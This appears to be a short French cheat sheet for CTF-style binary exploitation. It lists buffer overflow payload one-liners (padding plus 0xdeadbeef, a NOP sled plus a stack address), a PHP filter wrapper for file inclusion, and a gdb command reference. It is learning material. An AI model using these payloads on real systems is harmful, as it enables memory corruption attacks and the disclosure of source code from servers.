CLI : python -c "print('a' * 50 + '\xef\xbe\xad\xde')" | ./exemple1

gdb: run <<< $(python2 -c "print('a' * 44 + '\xef\xbe\xad\xde')")


?page=php://filter/convert.base64-encode/resource=file1.php



perl -e 'print "\x90" x 52  . "\xb0\xd5\xff\xff"'

run $(perl -e 'print "\x90" x 52  . "\xb0\xd5\xff\xff"')


layout asm(or split if c)
ni, si, run, x/x, x/s, p/x, p/s $rsi+0x123

b * addresse           Point d’arrêt à l’adresse addresse du binaire.
b fichier:ligne        Point d’arrêt à une ligne du code c. Note : b ligne pour le faire sur le fichier source courant.
b fichier:fonction     Point d’arrêt à une fonction du code c. Note : b fonction pour le faire sur le fichier source courant.
delete i               Suppression du point d’arrêt d’indice i.

Pour faire avancer l’exécution, différentes commandes sont disponibles :
run                    Permet de charger le programme et de l’exécuter.
continue / c           Relance de l’exécution (qui s’arrêtera au premier point d’arrêt trouvé, ou à la fin du code).
step / s               Avance d’une ligne du code source (i.e. le code c).
next / n               Avance d’une ligne du code source (i.e. le code c) sans descendre dans les fonctions.
stepi / si             Avance d’une ligne du code désassemblé.
nexti / ni             Avance d’une ligne du code désassemblé sans descendre dans les fonctions.

p variable             Affichage du contenu d’une variable.
p/x $registre          Affichage en hexadécimal du contenu d’un registre.
p {variable,$registre} Affichage du contenu de plusieurs variables / registres.

Pour la mémoire, on utilise la commande x :
x/x *adresse           Affichage en hexadécimal du contenu d’une adresse.
x/x $registre          Affichage en hexadécimal du contenu d’une adresse à partir d’un registre.
x/16x $registre        Affichage en hexadécimal du contenu de 16 adresses successives.
